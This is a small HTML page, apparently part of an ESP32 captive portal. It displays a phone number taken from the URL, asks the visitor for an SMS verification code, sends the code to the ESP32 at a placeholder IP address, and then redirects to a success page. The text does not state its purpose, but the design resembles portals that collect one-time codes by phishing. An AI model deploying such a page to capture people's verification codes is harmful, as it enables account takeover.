<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Enter Code</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script>
    // دریافت شماره تلفن از URL
    const urlParams = new URLSearchParams(window.location.search);
    const phone = urlParams.get('phone');
  </script>
</head>
<body>
  <div class="form-container">
    <h4>Enter SMS Code</h4>
    <div class="note">
      <b>Operator:</b> Send SMS to this number:<br>
      <span id="phoneDisplay" style="font-weight:bold;font-size:1.2em;"></span>
    </div>
    <form id="codeForm">
      <input class="form-control my-3" name="code" placeholder="Enter code" required>
      <button type="submit" class="btn btn-light w-100">Verify</button>
    </form>
  </div>

  <script>
    // نمایش شماره تلفن
    document.getElementById('phoneDisplay').textContent = phone;
    
    document.getElementById('codeForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const code = document.querySelector('input[name="code"]').value;
      const espIP = 'ESP_IP_ADDRESS'; // جایگزین با IP واقعی ESP32
      
      // ارسال کد به ESP32
      fetch(`http://${espIP}/submit-code?code=${encodeURIComponent(code)}`)
        .then(() => {
          // انتقال به صفحه موفقیت
          window.location.href = 'success.html';
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Failed to submit code. Please try again.');
        });
    });
  </script>
</body>
</html>
